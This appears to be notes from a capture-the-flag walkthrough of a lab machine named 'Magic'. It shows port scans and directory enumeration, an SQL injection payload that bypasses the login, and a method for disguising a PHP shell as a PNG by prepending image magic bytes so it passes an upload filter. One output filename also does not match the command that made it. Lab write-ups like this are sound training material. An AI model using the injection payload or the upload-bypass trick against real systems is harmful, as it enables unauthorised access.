
# Magic

## NMAP

* Rustscan

```console
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

* NMAP

```console
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web

* Landing page

* Dirsearch

```bash
export URL=http://$IP/

dirsearch -u $URL -x 404
[10:50:00] 301 -  315B - /assets-> http://10.129.79.172/assets
[10:50:00] 403 -  278B  - /assets/ 
[10:50:02] 403 -  278B  - /back.sql
[10:50:02] 403 -  278B  - /backup.sql
[10:50:02] 403 -  278B  - /backup.sql.old
[10:50:03] 403 -  278B  - /backups.sql
[10:51:00] 200 -    1KB - /login.php         
[10:51:01] 302 -    0B  - /logout.php  ->  index.php 
[10:52:26] 302 -    3KB - /upload.php  ->  login.php
```

* SQLi basic login bypass

```sql
username=admin'+or+'1'%3d'1'--&password=1234
```

* Magic Bytes for Reverse Shell

```bash
head -c 20 ajax.png|xxd

00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0200

head -c 20 ajax.png > test

file test
test: PNG image data, 512 x 0, 0-bit grayscale, non-interlaced

cat test shell.php > magical-shell.php.pmg
magic-shell.php.png: PNG image data, 512 x 1010777440, 36-bit

```
